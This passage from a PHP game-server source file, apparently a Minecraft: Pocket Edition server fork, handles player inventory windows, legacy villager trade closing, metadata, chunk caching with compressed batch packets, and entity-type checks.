	 * @return int
	 */
	public function addWindow(Inventory $inventory, int $forceId = null) : int{
		if($this->windows->contains($inventory)){
			return $this->windows[$inventory];
		}

		if($forceId === null){
			$this->windowCnt = $cnt = max(2, ++$this->windowCnt % 99);
		}else{
			$cnt = (int) $forceId;
		}
		$this->windowIndex[$cnt] = $inventory;
		$this->windows->attach($inventory, $cnt);
		if($inventory->open($this)){
			return $cnt;
		}else{
			$this->removeWindow($inventory);

			return -1;
		}
	}

	public function closeLegacyVillagerTradeWindowLikeSimpleMenu(VillagerTradeInventory $inventory) : bool{
		if(!ProtocolCompatibility::isProtocol012((int) $this->protocol) and !ProtocolCompatibility::isProtocol013((int) $this->protocol)){
			return false;
		}

		$windowId = $this->getWindowId($inventory);
		if($windowId === -1){
			return false;
		}

		$pk = new ContainerClosePacket();
		$pk->windowid = $windowId;
		$pk->setChannel(Network::CHANNEL_WORLD_EVENTS);
		$this->dataPacket($pk);

		$inventory->restoreTemporaryPlayerInventorySlots($this);
		$inventory->releaseLegacyViewer($this);
		$inventory->scheduleLegacyFakeBlockRemoval($this);

		if($this->windows->contains($inventory)){
			$this->windows->detach($inventory);
		}
		unset($this->windowIndex[$windowId]);

		return true;
	}

	public function removeWindow(Inventory $inventory){
		$inventory->close($this);
		if($this->windows->contains($inventory)){
			$id = $this->windows[$inventory];
			$this->windows->detach($this->windowIndex[$id]);
			unset($this->windowIndex[$id]);
		}
	}

	public function setMetadata($metadataKey, MetadataValue $metadataValue){
		$this->server->getPlayerMetadata()->setMetadata($this, $metadataKey, $metadataValue);
	}

	public function getMetadata($metadataKey){
		return $this->server->getPlayerMetadata()->getMetadata($this, $metadataKey);
	}

	public function hasMetadata($metadataKey){
		return $this->server->getPlayerMetadata()->hasMetadata($this, $metadataKey);
	}

	public function removeMetadata($metadataKey, Plugin $plugin){
		$this->server->getPlayerMetadata()->removeMetadata($this, $metadataKey, $plugin);
	}


	public function onChunkChanged(FullChunk $chunk){
		$this->loadQueue[Level::chunkHash($chunk->getX(), $chunk->getZ())] = abs(($this->x >> 4) - $chunk->getX()) + abs(($this->z >> 4) - $chunk->getZ());
	}

	public function onChunkLoaded(FullChunk $chunk){

	}

	public function onChunkPopulated(FullChunk $chunk){

	}

	public function onChunkUnloaded(FullChunk $chunk){

	}

	public function onBlockChanged(Vector3 $block){

	}

	public function getLoaderId(){
		return $this->loaderId;
	}

	public function isLoaderActive(){
		return $this->isConnected();
	}

	/**
	 * @param     $chunkX
	 * @param     $chunkZ
	 * @param     $payload
	 * @param int $ordering
	 * @return array
	 */
	public static function getChunkCacheFromData($chunkX, $chunkZ, $payload, $ordering = FullChunkDataPacket::ORDER_COLUMNS, $compressionLevel = 7){
		$cache = [
			"payload" => $payload,
			"ordering" => $ordering
		];

		if(Network::$BATCH_THRESHOLD >= 0){
			$mappedPayload = ProtocolCompatibility::remapChunkPayloadForProtocol(Info::CURRENT_PROTOCOL, $payload);
			$pk = new FullChunkDataPacket();
			$pk->chunkX = $chunkX;
			$pk->chunkZ = $chunkZ;
			$pk->order = $ordering;
			$pk->data = $mappedPayload;
			$pk->protocol = Info::CURRENT_PROTOCOL;
			$pk->encode();
			$pk->isEncoded = true;

			$compressed = zlib_encode(Binary::writeInt(strlen($pk->getBuffer())) . $pk->getBuffer(), ZLIB_ENCODING_DEFLATE, (int) $compressionLevel);
			if(is_string($compressed)){
				$batch = new BatchPacket();
				$batch->payload = $compressed;
				$batch->protocol = Info::CURRENT_PROTOCOL;
				$batch->protocolMapped = true;
				$batch->encode();
				$batch->isEncoded = true;

				$cache["currentProtocol"] = Info::CURRENT_PROTOCOL;
				$cache["currentProtocolBatch"] = $batch;
			}
		}

		return $cache;
	}

	public function setNameTag($name){
		if($this->server->antiToolbox){
			$name .= "\n" . TextFormat::ESCAPE . "\x01";
		}
		parent::setNameTag($name);
	}

	private static function isValidChatMessage($message) : bool{
		$message = (string) $message;

		return trim($message) !== "" and strlen($message) <= 255;
	}

	private function isUndeadEntity(Entity $entity){
		return $entity instanceof \lycore\entity\Zombie or
			$entity instanceof \lycore\entity\ZombieVillager or
			$entity instanceof \lycore\entity\Skeleton or
			$entity instanceof \lycore\entity\PigZombie;
	}

	private function isArthropodEntity(Entity $entity){
		return $entity instanceof \lycore\entity\Spider or
			$entity instanceof \lycore\entity\CaveSpider or
			$entity instanceof \lycore\entity\Silverfish;
	}


}
